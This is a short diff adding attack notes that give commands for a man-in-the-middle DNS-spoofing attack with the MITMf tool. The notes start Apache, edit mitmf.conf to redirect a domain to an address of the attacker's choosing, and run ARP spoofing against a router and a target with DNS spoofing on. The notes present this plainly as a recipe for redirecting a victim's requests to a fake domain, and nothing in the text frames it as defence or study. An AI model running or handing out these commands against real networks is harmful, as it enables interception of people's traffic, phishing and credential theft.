@@ -1,0 +1,7 @@
+//Redirect any request to a certain domain to a fake domain
+//first edit dns
+service apache2 start
+leafpad /etc/mitmf/mitmf.conf
+//There you can replace the IP with whatever you want to forward to
+//Finally start the DNS-spoofing
+mitmf --arp --spoof -gateway (ROUTERIP) --target (TARGETIP) -i (INTERFACE) --dns
